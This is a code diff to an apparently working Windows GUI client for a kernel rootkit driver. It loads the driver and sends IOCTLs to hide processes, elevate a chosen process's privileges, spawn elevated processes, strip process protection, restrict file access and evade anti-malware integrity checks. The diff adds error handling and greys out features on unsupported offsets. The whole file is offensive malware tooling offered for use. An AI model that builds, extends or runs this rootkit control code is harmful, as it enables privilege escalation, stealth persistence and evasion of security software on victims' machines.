@@ -21,13 +21,14 @@
 #include "components.h"
 #include <stdio.h>
 #include <Windows.h>
+
 #include <winioctl.h>
 #define GL_SILENCE_DEPRECATION
 #if defined(IMGUI_IMPL_OPENGL_ES2)
 #include <GLES2/gl2.h>
 #endif
 
-
+#include <ntstatus.h>
 
 // [Win32] Our example includes a copy of glfw3.lib pre-compiled with VS2010 to maximize ease of testing and compatibility with old VS compilers.
 // To link with VS2010-era libraries, VS2015+ requires linking with legacy_stdio_definitions.lib, which we do using this pragma.
@@ -105,6 +106,11 @@ Texture	readTextureFile()
 #define RESTRICT_ACCESS_TO_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x169,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
 #define BYPASS_INTEGRITY_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x170,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
+
+
+#define STATUS_ALREADY_EXISTS ((int)0xB7)
+#define ERROR_UNSUPPORTED_OFFSET ((int)0x00000233)
 
 BOOL loadDriver(char* driverPath) {
     SC_HANDLE hSCM, hService;
@@ -236,7 +242,7 @@ int main(int, char**)
     ImGui_ImplOpenGL3_Init(glsl_version);
 
 
-
+    int STATUS = 0;
     char buf[MAX_PATH] = { 0 };
     char filename[MAX_PATH] = { 0 };
     bool show_demo_window = false;
@@ -255,9 +261,12 @@ int main(int, char**)
     int lpBytesReturned = 0;
     bool all_windows = false;
     int pid = 0;
+    char* text_error_ = NULL;
     ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
     Texture	tex = readTextureFile();
+    int check_off = 0;
 
+    int checkbox = 0;
 #ifdef __EMSCRIPTEN__
     io.IniFilename = nullptr;
     EMSCRIPTEN_MAINLOOP_BEGIN
@@ -315,13 +324,13 @@ int main(int, char**)
 
                 if (hdevice == INVALID_HANDLE_VALUE)
                 {
-                    printf("unable to connect to rootkit INVALID_HANDLE_VALUE\n");
+                    printf("unable to connect to rootkit %X\n", GetLastError());
 
                     is_rootket_connected = 0;
                 }
                 else
                 {
-                    printf(" Rootkit-Connected\n");
+                    printf("Rootkit-Connected\n");
 
                     is_rootket_connected = 1;
                 }
@@ -346,14 +355,37 @@ int main(int, char**)
                 ImGui::PopStyleColor();
             }
 
-            ImGui::Checkbox("Demo Window", &show_demo_window); ImGui::Checkbox("Hide Process", &hide_specific_process);
+            ImGui::Checkbox("Demo Window", &show_demo_window);
 
-            ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
+            if (check_off)
+            {
+                ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 0, 0, 255));
 
-            ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
+                ImGui::PushItemFlag(ImGuiItemFlags_Disabled, true);
 
-            ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
+                ImGui::Checkbox("Hide Process", &hide_specific_process);
 
+                ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);// add alternative
+
+                ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
+
+                ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
+
+                ImGui::PopItemFlag();
+
+                ImGui::PopStyleColor();
+            }
+            else
+            {
+                ImGui::Checkbox("Hide Process", &hide_specific_process);
+
+                ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
+
+                ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
+
+                ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
+
+            }
             ImGui::Checkbox("Restrict Access To File", &restrict_access_to_file);
 
             ImGui::Checkbox("Bypass the file integrity check and protect it against anti-malware", &spoof_file);
@@ -365,7 +397,7 @@ int main(int, char**)
 
         if (elev_specific_process)
         {
-            component_color_handler = 0;
+
             ImGui::Begin("Another Window", &elev_specific_process); ImGui::Text("Enter PID");
 
             ImGui::SameLine();
@@ -374,6 +406,7 @@ int main(int, char**)
 
             if (ImGui::Button("Elevate Porcess"))
             {
+                checkbox = 1;
                 pid = atoi(buf);
 
                 if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
@@ -388,6 +421,10 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
+                if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET)
+                {
+                    check_off = 1;
+                }
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
                 ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
@@ -431,6 +468,10 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
+                if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET)
+                {
+                    check_off = 1;
+                }
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
                 ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
@@ -468,6 +509,10 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
+                if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET)
+                {
+                    check_off = 1;
+                }
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
                 ImGui::Text("Failed to send the IOCTL.");
 
@@ -518,10 +563,11 @@ int main(int, char**)
 
                     printf("filename to restrict access ( %ls ) \n", operation_client.filename);
 
-                    if (DeviceIoControl(hdevice, RESTRICT_ACCESS_TO_FILE_CTL, (LPVOID)&operation_client, sizeof(operation_client), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
+                    if (STATUS = DeviceIoControl(hdevice, RESTRICT_ACCESS_TO_FILE_CTL, (LPVOID)&operation_client, sizeof(operation_client), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                         component_color_handler = 2;
                     else
                         component_color_handler = 1;
+
                 }
                 else
                 {
@@ -535,7 +581,8 @@ int main(int, char**)
             {
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
-                ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename and valid pid.");
+                (lpBytesReturned == STATUS_ALREADY_EXISTS) ? ImGui::Text("hook already installed with the same config (duplicated structure)")\
+                    : ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename and valid pid.");
             }
             if (component_color_handler == 2)
             {
@@ -589,8 +636,8 @@ int main(int, char**)
             if (component_color_handler == 1)
             {
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
-
-                ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename.");
+                (lpBytesReturned == STATUS_ALREADY_EXISTS) ? ImGui::Text("hook already installed with the same config (duplicated structure)")\
+                    : ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename.");
             }
             if (component_color_handler == 2)
             {
@@ -631,6 +678,10 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
+                if (lpBytesReturned == ERROR_UNSUPPORTED_OFFSET)
+                {
+                    check_off = 1;
+                }
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
                 ImGui::Text("Failed to send the IOCTL.");
 
